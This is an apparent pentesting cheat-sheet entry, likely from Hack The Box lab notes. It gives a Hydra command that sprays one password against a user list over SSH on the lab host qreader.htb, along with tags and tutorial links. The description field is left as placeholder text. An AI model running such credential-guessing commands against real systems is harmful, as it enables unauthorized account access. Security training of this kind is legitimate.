---
description: |
  Description what the command does and is usefull for.

  Command Reference:
  ```
  List of users: userlist.txt

  Password: denjanjade122566

  Server/IP: qreader.htb

  Service: ssh
  ```
command: |
  hydra -L userlist.txt -p denjanjade122566 qreader.htb ssh 

items:
  - Username
  - Password
  - No_creds
services:
  - SSH
  - SMB
  - WMI
OS:
  - Windows
  - Linux
attack_types:
  - Enumeration
  - Exploitation
  - Cracking
references:
  - https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
  - https://www.kali.org/tools/hydra/
---